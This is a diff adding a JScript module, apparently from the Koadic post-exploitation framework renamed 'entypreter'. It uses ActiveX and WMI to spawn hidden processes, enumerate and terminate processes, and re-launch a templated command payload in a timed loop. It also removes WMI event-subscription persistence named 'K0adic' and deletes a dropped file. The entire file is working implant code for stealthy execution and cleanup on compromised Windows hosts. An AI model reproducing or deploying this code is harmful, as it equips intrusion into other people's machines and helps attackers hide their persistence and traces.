@@ -1,0 +1,266 @@
+var entypreter = {};
+
+entypreter.WS = new ActiveXObject("WScript.Shell");
+entypreter.FS = new ActiveXObject("Scripting.FileSystemObject");
+
+entypreter.registry = {};
+entypreter.registry.HKCU = 0x80000001;
+entypreter.registry.HKLM = 0x80000002;
+
+entypreter.isHTA = function()
+{
+    return typeof(window) !== "undefined";
+}
+
+entypreter.process = {};
+
+entypreter.process.currentPID = function()
+{
+    var cmd = entypreter.file.getPath("%comspec% /K hostname");
+    var childPid = entypreter.WMI.createProcess(cmd);
+    var pid = -1;
+    var latestTime = 0;
+    var latestProc = null;
+
+    var processes = entypreter.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.ProcessId == childPid)
+            {
+                latestProc = proc;
+                break;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    pid = latestProc.ParentProcessId;
+    latestProc.Terminate();
+
+    return pid;
+}
+
+entypreter.process.kill = function(pid)
+{
+    var processes = entypreter.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.ProcessId == pid)
+            {
+                proc.Terminate();
+                return true;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    return false;
+}
+
+entypreter.process.list = function()
+{
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+    var query = "Select * From Win32_Process";
+
+    return wmi.ExecQuery(query);
+}
+
+entypreter.exit = function()
+{
+    if (entypreter.isHTA())
+    {
+        try {
+          window.close();
+        } catch(e){}
+
+        try {
+          window.self.close();
+        } catch (e){}
+
+        try {
+          window.top.close();
+        } catch (e){}
+
+
+        try{
+            self.close();
+        } catch (e){}
+
+        try
+        {
+            window.open('', '_self', '');
+            window.close();
+        }
+        catch (e)
+        {
+        }
+    }
+
+    try
+    {
+        WScript.quit();
+    }
+    catch (e)
+    {
+    }
+
+    try
+    {
+        var pid = entypreter.process.currentPID();
+        entypreter.process.kill(pid);
+    }
+    catch (e)
+    {
+    }
+}
+
+entypreter.WMI = {};
+
+entypreter.WMI.createProcess = function(cmd)
+{
+    var SW_HIDE = 0;
+    var pid = 0;
+
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+
+    var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+    si.ShowWindow = SW_HIDE;
+    si.CreateFlags = 16777216;
+    si.X = si.Y = si.XSize = si.ySize = 1;
+
+    var w32proc = wmi.Get("Win32_Process");
+
+    var method = w32proc.Methods_.Item("Create");
+    var inParams = method.InParameters.SpawnInstance_();
+    inParams.CommandLine = cmd;
+    inParams.CurrentDirectory = null;
+    inParams.ProcessStartupInformation = si;
+
+    var outParams = w32proc.ExecMethod_("Create", inParams);
+    return outParams.ProcessId;
+}
+
+entypreter.process.kill = function(pid)
+{
+    var processes = entypreter.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.ProcessId == pid)
+            {
+                proc.Terminate();
+                return true;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    return false;
+}
+
+entypreter.file = {};
+
+entypreter.file.getPath = function(path)
+{
+    return entypreter.WS.ExpandEnvironmentStrings(path);
+}
+
+entypreter.file.deleteFile = function(path)
+{
+    entypreter.FS.DeleteFile(entypreter.file.getPath(path), true);
+};
+
+entypreter.shell = {};
+entypreter.shell.run = function(cmd, fork)
+{
+    var fork = (typeof(fork) !== "undefined") ? fork : true;
+    var c = "%comspec% /q /c " + cmd;
+    entypreter.WS.Run(cmd, 0, !fork);
+}
+
+entypreter.persist = {};
+entypreter.persist.run = function(cmd)
+{
+    var pid = entypreter.WMI.createProcess(cmd);
+    entypreter.shell.run('ping 127.0.0.1 -n 11', false);
+    return pid;
+}
+
+entypreter.persist.clean = function()
+{
+    var subname = "K0adic";
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
+    wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
+    wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
+    var ftcb = wmi.Get("__FilterToConsumerBinding").Instances_();
+    var instancecount = ftcb.Count;
+    var i;
+    for (i = 0; i < instancecount; i++) {
+        var cons = ftcb.ItemIndex(i);
+        if (cons.Consumer.indexOf(subname) != -1) {
+            cons.Delete_();
+        }
+    }
+    entypreter.file.deleteFile(entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~"));
+}
+
+try
+{
+    var attempts = ~RETRYATTEMPTS~;
+    var delay = ~RETRYDELAY~ + 1;
+    var infflag = false;
+    if (attempts == -1)
+    {
+        infflag = true;
+    }
+    while (true)
+    {
+        var pid = entypreter.persist.run("~CMD~");
+        if (entypreter.process.kill(pid))
+        {
+            if (!infflag)
+            {
+                attempts -= 1;
+                if (attempts == 0)
+                {
+                    entypreter.persist.clean();
+                    break;
+                }
+            }
+            entypreter.shell.run('ping 127.0.0.1 -n '+delay.toString(), false);
+        }
+        else
+        {
+            break;
+        }
+    }
+}
+catch(e)
+{
+    //do nothing
+}
+
+entypreter.exit();
